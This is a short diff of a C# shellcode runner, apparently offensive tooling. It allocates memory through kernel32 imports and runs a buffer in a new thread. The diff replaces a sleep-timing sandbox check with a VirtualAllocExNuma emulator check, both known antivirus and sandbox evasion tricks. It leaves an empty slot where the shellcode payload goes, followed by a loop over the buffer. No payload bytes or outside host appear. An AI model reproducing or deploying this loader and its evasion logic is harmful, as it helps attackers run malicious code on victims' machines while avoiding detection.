@@ -6,28 +6,30 @@ using System.Text;
 using System.Threading.Tasks;
 
 
-namespace rev
+namespace thanos
 {
-    public class Program
+    public class black_order
     {
         [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
         static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
         [DllImport("kernel32.dll")]
         static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
-        [DllImport("kernel32.dll")]
-        static extern void Sleep(uint dwMilliseconds);
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetCurrentProcess();
         public static void Main(string[] args)
         {
-            DateTime initial_t = DateTime.Now;
-            Sleep(2700);
-            double final_t = DateTime.Now.Subtract(initial_t).TotalSeconds;
-            if (final_t < 2.4)
+            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
+            if (mem == null)
             {
                 return;
             }
-            //shellcode here
+            
+
+            
 
             for (int i = 0; i < buf.Length; i++)
             {
